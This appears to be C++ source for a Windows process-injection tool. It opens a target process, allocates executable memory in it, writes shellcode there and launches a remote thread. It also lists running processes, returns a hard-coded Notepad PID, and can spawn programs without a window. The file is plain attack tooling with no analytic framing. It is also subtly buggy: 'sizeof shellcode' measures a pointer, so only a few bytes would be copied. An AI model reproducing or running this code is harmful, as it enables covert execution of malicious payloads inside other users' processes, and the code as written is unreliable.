#include "inject.h"
#include <iostream>

void inject(char* shellcode, int pid)
{
    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    printf("Injecting to PID: %i", DWORD(pid));
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
};

int getProcID()
{
    // Get a list of process indentifiers

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    int notepad_id = 35244;

    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
    {
        // failed
        return 1;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    for (i = 0; i < cProcesses; i++)
    {
        if( aProcesses[i] != 0 )
        {
            std::cout << aProcesses[i] << std::endl;
        }
    }
    std::cout << cProcesses << std::endl;
    // return cProcesses;
    return notepad_id;

}

void spawnProcess(std::string exePath) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcessA( 
        exePath.data(),   
        NULL,         
        NULL,            
        NULL,            
        FALSE,          
        CREATE_NO_WINDOW,             
        NULL,           
        NULL,
        &si,
        &pi
    )) {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return;
    }

    std::cout << pi.dwProcessId << std::endl;
    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}